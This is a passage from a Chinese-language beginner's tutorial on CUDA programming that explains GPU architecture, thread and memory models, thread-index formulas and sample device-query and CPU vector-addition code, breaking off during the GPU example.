    <content type="html"><![CDATA[<p>CUDA（Compute Unified Device Architecture）的中文全称为计算统一设备架构。做图像视觉领域的同学多多少少都会接触到CUDA，毕竟要做性能速度优化，CUDA是个很重要的工具，CUDA是做视觉的同学难以绕过的一个坑，必须踩一踩才踏实。CUDA编程真的是入门容易精通难，具有计算机体系结构和C语言编程知识储备的同学上手CUDA编程应该难度不会很大。本文章将通过以下五个方面帮助大家比较全面地了解CUDA编程最重要的知识点，做到快速入门：</p><ol><li>GPU架构特点</li><li>CUDA线程模型</li><li>CUDA内存模型</li><li>CUDA编程模型</li><li>CUDA应用小例子</li></ol><h2 id="1-GPU架构特点"><a href="#1-GPU架构特点" class="headerlink" title="1. GPU架构特点"></a>1. GPU架构特点</h2><p>首先我们先谈一谈串行计算和并行计算。我们知道，高性能计算的关键利用多核处理器进行并行计算。</p><p>当我们求解一个计算机程序任务时，我们很自然的想法就是将该任务分解成一系列小任务，把这些小任务一一完成。在串行计算时，我们的想法就是让我们的处理器每次处理一个计算任务，处理完一个计算任务后再计算下一个任务，直到所有小任务都完成了，那么这个大的程序任务也就完成了。如下图所示，就是我们怎么用串行编程思想求解问题的步骤。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919122904566-1040268509.png"></p><p>但是串行计算的缺点非常明显，如果我们拥有多核处理器，我们可以利用多核处理器同时处理多个任务时，而且这些小任务并没有关联关系（不需要相互依赖，比如我的计算任务不需要用到你的计算结果），那我们为什么还要使用串行编程呢？为了进一步加快大任务的计算速度，我们可以把一些独立的模块分配到不同的处理器上进行同时计算（这就是并行），最后再将这些结果进行整合，完成一次任务计算。下图就是将一个大的计算任务分解为小任务，然后将独立的小任务分配到不同处理器进行并行计算，最后再通过串行程序把结果汇总完成这次的总的计算任务。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919122917935-1661200386.png"></p><p>所以，一个程序可不可以进行并行计算，关键就在于我们要分析出该程序可以拆分出哪几个执行模块，这些执行模块哪些是独立的，哪些又是强依赖强耦合的，独立的模块我们可以试着设计并行计算，充分利用多核处理器的优势进一步加速我们的计算任务，强耦合模块我们就使用串行编程，利用串行+并行的编程思路完成一次高性能计算。</p><p>接下来我们谈谈CPU和GPU有什么区别，他们俩各自有什么特点，我们在谈并行、串行计算时多次谈到“多核”的概念，现在我们先从“核”的角度开始这个话题。首先CPU是专为顺序串行处理而优化的几个核心组成。而GPU则由数以千计的更小、更高效的核心组成，这些核心专门为同时处理多任务而设计，可高效地处理并行任务。也就是，CPU虽然每个核心自身能力极强，处理任务上非常强悍，无奈他核心少，在并行计算上表现不佳；反观GPU，虽然他的每个核心的计算能力不算强，但他胜在核心非常多，可以同时处理多个计算任务，在并行计算的支持上做得很好。</p><p>GPU和CPU的不同硬件特点决定了他们的应用场景，CPU是计算机的运算和控制的核心，GPU主要用作图形图像处理。图像在计算机呈现的形式就是矩阵，我们对图像的处理其实就是操作各种矩阵进行计算，而很多矩阵的运算其实可以做并行化，这使得图像处理可以做得很快，因此GPU在图形图像领域也有了大展拳脚的机会。下图表示的就是一个多GPU计算机硬件系统，可以看出，一个GPU内存就有很多个SP和各类内存，这些硬件都是GPU进行高效并行计算的基础。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919122932879-1946399786.png"></p><p>现在再从数据处理的角度来对比CPU和GPU的特点。CPU需要很强的通用性来处理各种不同的数据类型，比如整型、浮点数等，同时它又必须擅长处理逻辑判断所导致的大量分支跳转和中断处理，所以CPU其实就是一个能力很强的伙计，他能把很多事处理得妥妥当当，当然啦我们需要给他很多资源供他使用（各种硬件），这也导致了CPU不可能有太多核心（核心总数不超过16）。而GPU面对的则是类型高度统一的、相互无依赖的大规模数据和不需要被打断的纯净的计算环境，GPU有非常多核心（费米架构就有512核），虽然其核心的能力远没有CPU的核心强，但是胜在多，<br>在处理简单计算任务时呈现出“人多力量大”的优势，这就是并行计算的魅力。</p><p>整理一下两者特点就是：</p><ul><li>CPU：擅长流程控制和逻辑处理，不规则数据结构，不可预测存储结构，单线程程序，分支密集型算法</li><li>GPU：擅长数据并行计算，规则数据结构，可预测存储模式</li></ul><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919122947035-1099878851.png"></p><p>现在的计算机体系架构中，要完成CUDA并行计算，单靠GPU一人之力是不能完成计算任务的，必须借助CPU来协同配合完成一次高性能的并行计算任务。</p><p>一般而言，并行部分在GPU上运行，串行部分在CPU运行，这就是异构计算。具体一点，异构计算的意思就是不同体系结构的处理器相互协作完成计算任务。CPU负责总体的程序流程，而GPU负责具体的计算任务，当GPU各个线程完成计算任务后，我们就将GPU那边计算得到的结果拷贝到CPU端，完成一次计算任务。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123003250-1159089426.png"></p><p>所以应用程序利用GPU实现加速的总体分工就是：密集计算代码（约占5%的代码量）由GPU负责完成，剩余串行代码由CPU负责执行。</p><h2 id="2-CUDA线程模型"><a href="#2-CUDA线程模型" class="headerlink" title="2. CUDA线程模型"></a>2. CUDA线程模型</h2><p>下面我们介绍CUDA的线程组织结构。首先我们都知道，线程是程序执行的最基本单元，CUDA的并行计算就是通过成千上万个线程的并行执行来实现的。下面的机构图说明了GPU的不同层次的结构。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123018799-1605248744.png"></p><p>CUDA的线程模型从小往大来总结就是：</p><ol><li>Thread：线程，并行的基本单位</li><li>Thread Block：线程块，互相合作的线程组，线程块有如下几个特点：</li></ol><ul><li>允许彼此同步</li><li>可以通过共享内存快速交换数据</li><li>以1维、2维或3维组织</li></ul><ol start="3"><li>Grid：一组线程块</li></ol><ul><li>以1维、2维组织</li><li>共享全局内存</li></ul><p>Kernel：在GPU上执行的核心程序，这个kernel函数是运行在某个Grid上的。</p><ul><li>One kernel &lt;-&gt; One Grid</li></ul><p>每一个block和每个thread都有自己的ID，我们通过相应的索引找到相应的线程和线程块。</p><ul><li>threadIdx，blockIdx</li><li>Block ID: 1D or 2D</li><li>Thread ID: 1D, 2D or 3D</li></ul><p>理解kernel，必须要对kernel的线程层次结构有一个清晰的认识。首先GPU上很多并行化的轻量级线程。kernel在device上执行时实际上是启动很多线程，一个kernel所启动的所有线程称为一个网格（grid），同一个网格上的线程共享相同的全局内存空间，grid是线程结构的第一层次，而网格又可以分为很多线程块（block），一个线程块里面包含很多线程，这是第二个层次。线程两层组织结构如上图所示，这是一个gird和block均为2-dim的线程组织。grid和block都是定义为dim3类型的变量，dim3可以看成是包含三个无符号整数（x，y，z）成员的结构体变量，在定义时，缺省值初始化为1。因此grid和block可以灵活地定义为1-dim，2-dim以及3-dim结构，kernel调用时也必须通过执行配置&lt;&lt;&lt;grid, block&gt;&gt;&gt;来指定kernel所使用的网格维度和线程块维度。举个例子，我们以上图为例，分析怎么通过&lt;&lt;&lt;grid,block&gt;&gt;&gt;&gt;这种标记方式索引到我们想要的那个线程。CUDA的这种&lt;&lt;&lt;grid,block&gt;&gt;&gt;其实就是一个多级索引的方法，第一级索引是(grid.xIdx, grid.yIdy)，对应上图例子就是(1, 1)，通过它我们就能找到了这个线程块的位置，然后我们启动二级索引(block.xIdx, block.yIdx, block.zIdx)来定位到指定的线程。这就是我们CUDA的线程组织结构。</p><p>这里想谈谈SP和SM（流处理器），很多人会被这两个专业名词搞得晕头转向。</p><ul><li>SP：最基本的处理单元，streaming processor，也称为CUDA core。最后具体的指令和任务都是在SP上处理的。GPU进行并行计算，也就是很多个SP同时做处理。</li><li>SM：多个SP加上其他的一些资源组成一个streaming multiprocessor。也叫GPU大核，其他资源如：warp scheduler，register，shared memory等。SM可以看做GPU的心脏（对比CPU核心），register和shared memory是SM的稀缺资源。CUDA将这些资源分配给所有驻留在SM中的threads。因此，这些有限的资源就使每个SM中active warps有非常严格的限制，也就限制了并行能力。</li></ul><p>需要指出，每个SM包含的SP数量依据GPU架构而不同，Fermi架构GF100是32个，GF10X是48个，Kepler架构都是192个，Maxwell都是128个。</p><p>简而言之，SP是线程执行的硬件单位，SM中包含多个SP，一个GPU可以有多个SM（比如16个），最终一个GPU可能包含有上千个SP。这么多核心“同时运行”，速度可想而知，这个引号只是想表明实际上，软件逻辑上是所有SP是并行的，但是物理上并不是所有SP都能同时执行计算（比如我们只有8个SM却有1024个线程块需要调度处理），因为有些会处于挂起，就绪等其他状态，这有关GPU的线程调度。</p><p>下面这个图将从硬件角度和软件角度解释CUDA的线程模型。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123034967-1110899742.png"></p><ul><li>每个线程由每个线程处理器（SP）执行</li><li>线程块由多核处理器（SM）执行</li><li>一个kernel其实由一个grid来执行，一个kernel一次只能在一个GPU上执行</li></ul><p>block是软件概念，一个block只会由一个sm调度，程序员在开发时，通过设定block的属性，告诉GPU硬件，我有多少个线程，线程怎么组织。而具体怎么调度由sm的warps scheduler负责，block一旦被分配好SM，该block就会一直驻留在该SM中，直到执行结束。一个SM可以同时拥有多个blocks，但需要序列执行。下图显示了GPU内部的硬件架构：</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123048002-1383369419.png"></p><h2 id="3-CUDA内存模型"><a href="#3-CUDA内存模型" class="headerlink" title="3. CUDA内存模型"></a>3. CUDA内存模型</h2><p>CUDA中的内存模型分为以下几个层次：</p><ul><li>每个线程都用自己的registers（寄存器）</li><li>每个线程都有自己的local memory（局部内存）</li><li>每个线程块内都有自己的shared memory（共享内存），所有线程块内的所有线程共享这段内存资源</li><li>每个grid都有自己的global memory（全局内存），不同线程块的线程都可使用</li><li>每个grid都有自己的constant memory（常量内存）和texture memory（纹理内存），），不同线程块的线程都可使用</li></ul><p>线程访问这几类存储器的速度是register &gt; local memory &gt;shared memory &gt; global memory</p><p>下面这幅图表示就是这些内存在计算机架构中的所在层次。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123101933-1651940595.png"></p><h2 id="4-CUDA编程模型"><a href="#4-CUDA编程模型" class="headerlink" title="4. CUDA编程模型"></a>4. CUDA编程模型</h2><p>上面讲了这么多硬件相关的知识点，现在终于可以开始说说CUDA是怎么写程序的了。</p><p>我们先捋一捋常见的CUDA术语：</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123113524-1183131017.png"></p><p>第一个要掌握的编程要点：我们怎么写一个能在GPU跑的程序或函数呢？</p><p>通过关键字就可以表示某个程序在CPU上跑还是在GPU上跑！如下表所示，比如我们用__global__定义一个kernel函数，就是CPU上调用，GPU上执行，注意__global__函数的返回值必须设置为void。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123125957-1702896390.png"></p><p>第二个编程要点：CPU和GPU间的数据传输怎么写？</p><p>首先介绍在GPU内存分配回收内存的函数接口：</p><ul><li>cudaMalloc(): 在设备端分配global memory</li><li>cudaFree(): 释放存储空间</li></ul><p>CPU的数据和GPU端数据做数据传输的函数接口是一样的，他们通过传递的函数实参（枚举类型）来表示传输方向：</p><p>cudaMemcpy(void *dst, void *src, size_t nbytes,<br>enum cudaMemcpyKind direction)</p><p>enum cudaMemcpyKind:</p><ul><li>cudaMemcpyHostToDevice（CPU到GPU）</li><li>cudaMemcpyDeviceToHost（GPU到CPU）</li><li>cudaMemcpyDeviceToDevice（GPU到GPU）</li></ul><p>第三个编程要点是：怎么用代码表示线程组织模型？<br>我们可以用dim3类来表示网格和线程块的组织方式，网格grid可以表示为一维和二维格式，线程块block可以表示为一维、二维和三维的数据格式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dim3 DimGrid(100, 50);  &#x2F;&#x2F;5000个线程块，维度是100*50</span><br><span class="line">dim3 DimBlock(4, 8, 8);  &#x2F;&#x2F;每个线层块内包含256个线程，线程块内的维度是4*8*8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来介绍一个非常重要又很难懂的一个知识点，我们怎么计算线程号呢？</p><h3 id="1-使用N个线程块，每一个线程块只有一个线程，即"><a href="#1-使用N个线程块，每一个线程块只有一个线程，即" class="headerlink" title="1.使用N个线程块，每一个线程块只有一个线程，即"></a>1.使用N个线程块，每一个线程块只有一个线程，即</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dim3 dimGrid(N);</span><br><span class="line">dim3 dimBlock(1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时的线程号的计算方式就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threadId &#x3D; blockIdx.x;</span><br></pre></td></tr></table></figure><p>其中threadId的取值范围为0到N-1。对于这种情况，我们可以将其看作是一个列向量，列向量中的每一行对应一个线程块。列向量中每一行只有1个元素，对应一个线程。</p><h3 id="2-使用M×N个线程块，每个线程块1个线程"><a href="#2-使用M×N个线程块，每个线程块1个线程" class="headerlink" title="2.使用M×N个线程块，每个线程块1个线程"></a>2.使用M×N个线程块，每个线程块1个线程</h3><p>由于线程块是2维的，故可以看做是一个M*N的2维矩阵，其线程号有两个维度，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dim3 dimGrid(M,N);</span><br><span class="line">dim3 dimBlock(1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blockIdx.x 取值0到M-1</span><br><span class="line">blcokIdx.y 取值0到N-1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种情况一般用于处理2维数据结构，比如2维图像。每一个像素用一个线程来处理，此时需要线程号来映射图像像素的对应位置，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pos &#x3D; blockIdx.y * blcokDim.x + blockIdx.x; &#x2F;&#x2F;其中gridDim.x等于M</span><br></pre></td></tr></table></figure><h3 id="3-使用一个线程块，该线程具有N个线程，即"><a href="#3-使用一个线程块，该线程具有N个线程，即" class="headerlink" title="3.使用一个线程块，该线程具有N个线程，即"></a>3.使用一个线程块，该线程具有N个线程，即</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dim3 dimGrid(1);</span><br><span class="line">dim3 dimBlock(N);</span><br></pre></td></tr></table></figure><p>此时线程号的计算方式为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threadId &#x3D; threadIdx.x;</span><br></pre></td></tr></table></figure><p>其中threadId的范围是0到N-1，对于这种情况，可以看做是一个行向量，行向量中的每一个元素的每一个元素对应着一个线程。</p><h3 id="4-使用M个线程块，每个线程块内含有N个线程，即"><a href="#4-使用M个线程块，每个线程块内含有N个线程，即" class="headerlink" title="4.使用M个线程块，每个线程块内含有N个线程，即"></a>4.使用M个线程块，每个线程块内含有N个线程，即</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dim3 dimGrid(M);</span><br><span class="line">dim3 dimBlock(N);</span><br></pre></td></tr></table></figure><p>这种情况，可以把它想象成二维矩阵，矩阵的行与线程块对应，矩阵的列与线程编号对应，那线程号的计算方式为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threadId &#x3D; threadIdx.x + blcokIdx*blockDim.x;</span><br></pre></td></tr></table></figure><p>上面其实就是把二维的索引空间转换为一维索引空间的过程。</p><h3 id="5-使用M×N的二维线程块，每一个线程块具有P×Q个线程，即"><a href="#5-使用M×N的二维线程块，每一个线程块具有P×Q个线程，即" class="headerlink" title="5.使用M×N的二维线程块，每一个线程块具有P×Q个线程，即"></a>5.使用M×N的二维线程块，每一个线程块具有P×Q个线程，即</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dim3 dimGrid(M, N);</span><br><span class="line">dim3 dimBlock(P, Q);</span><br></pre></td></tr></table></figure><p>这种情况其实是我们遇到的最多情况，特别适用于处理具有二维数据结构的算法，比如图像处理领域。</p><p>其索引有两个维度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">threadId.x &#x3D; blockIdx.x*blockDim.x+threadIdx.x;</span><br><span class="line">threadId.y &#x3D; blockIdx.y*blockDim.y+threadIdx.y;</span><br></pre></td></tr></table></figure><p>上述公式就是把线程和线程块的索引映射为图像像素坐标的计算方法。</p><h2 id="CUDA应用例子"><a href="#CUDA应用例子" class="headerlink" title="CUDA应用例子"></a>CUDA应用例子</h2><p>我们已经掌握了CUDA编程的基本语法，现在我们开始以一些小例子来真正上手CUDA。</p><p>首先我们编写一个程序，查看我们GPU的一些硬件配置情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;device_launch_parameters.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int deviceCount;</span><br><span class="line">    cudaGetDeviceCount(&amp;deviceCount);</span><br><span class="line">    for(int i&#x3D;0;i&lt;deviceCount;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cudaDeviceProp devProp;</span><br><span class="line">        cudaGetDeviceProperties(&amp;devProp, i);</span><br><span class="line">        std::cout &lt;&lt; &quot;使用GPU device &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; devProp.name &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;设备全局内存总量： &quot; &lt;&lt; devProp.totalGlobalMem &#x2F; 1024 &#x2F; 1024 &lt;&lt; &quot;MB&quot; &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;SM的数量：&quot; &lt;&lt; devProp.multiProcessorCount &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;每个线程块的共享内存大小：&quot; &lt;&lt; devProp.sharedMemPerBlock &#x2F; 1024.0 &lt;&lt; &quot; KB&quot; &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;每个线程块的最大线程数：&quot; &lt;&lt; devProp.maxThreadsPerBlock &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;设备上一个线程块（Block）种可用的32位寄存器数量： &quot; &lt;&lt; devProp.regsPerBlock &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;每个EM的最大线程数：&quot; &lt;&lt; devProp.maxThreadsPerMultiProcessor &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;每个EM的最大线程束数：&quot; &lt;&lt; devProp.maxThreadsPerMultiProcessor &#x2F; 32 &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;设备上多处理器的数量： &quot; &lt;&lt; devProp.multiProcessorCount &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot; &lt;&lt; std::endl;     </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们利用nvcc来编译程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvcc test1.cu -o test1</span><br></pre></td></tr></table></figure><p>输出结果：因为我的服务器是8个TITAN GPU，为了省略重复信息，下面只显示两个GPU结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">使用GPU device 0: TITAN X (Pascal)</span><br><span class="line">设备全局内存总量： 12189MB</span><br><span class="line">SM的数量：28</span><br><span class="line">每个线程块的共享内存大小：48 KB</span><br><span class="line">每个线程块的最大线程数：1024</span><br><span class="line">设备上一个线程块（Block）种可用的32位寄存器数量： 65536</span><br><span class="line">每个EM的最大线程数：2048</span><br><span class="line">每个EM的最大线程束数：64</span><br><span class="line">设备上多处理器的数量： 28</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">使用GPU device 1: TITAN X (Pascal)</span><br><span class="line">设备全局内存总量： 12189MB</span><br><span class="line">SM的数量：28</span><br><span class="line">每个线程块的共享内存大小：48 KB</span><br><span class="line">每个线程块的最大线程数：1024</span><br><span class="line">设备上一个线程块（Block）种可用的32位寄存器数量： 65536</span><br><span class="line">每个EM的最大线程数：2048</span><br><span class="line">每个EM的最大线程束数：64</span><br><span class="line">设备上多处理器的数量： 28</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>第一个计算任务：将两个元素数目为1024×1024的float数组相加。</p><p>首先我们思考一下如果只用CPU我们怎么串行完成这个任务。</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123147745-348682595.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;time.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    struct timeval start, end;</span><br><span class="line">    gettimeofday( &amp;start, NULL );</span><br><span class="line">    float*A, *B, *C;</span><br><span class="line">    int n &#x3D; 1024 * 1024;</span><br><span class="line">    int size &#x3D; n * sizeof(float);</span><br><span class="line">    A &#x3D; (float*)malloc(size);</span><br><span class="line">    B &#x3D; (float*)malloc(size);</span><br><span class="line">    C &#x3D; (float*)malloc(size);</span><br><span class="line"></span><br><span class="line">    for(int i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] &#x3D; 90.0;</span><br><span class="line">        B[i] &#x3D; 10.0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    for(int i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        C[i] &#x3D; A[i] + B[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    float max_error &#x3D; 0.0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        max_error +&#x3D; fabs(100.0-C[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; &quot;max_error is &quot; &lt;&lt; max_error &lt;&lt; endl;</span><br><span class="line">    gettimeofday( &amp;end, NULL );</span><br><span class="line">    int timeuse &#x3D; 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec;</span><br><span class="line">    cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse&#x2F;1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CPU方式输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max_error is 0</span><br><span class="line">total time is 22ms</span><br></pre></td></tr></table></figure><p>如果我们使用GPU来做并行计算，速度将会如何呢？</p><p><img src="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/1093303-20180919123203820-1388097134.png"></p><p>编程要点：</p><ol><li>每个Block中的Thread数最大不超过512；</li><li>为了充分利用SM，Block数尽可能多，&gt;100。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 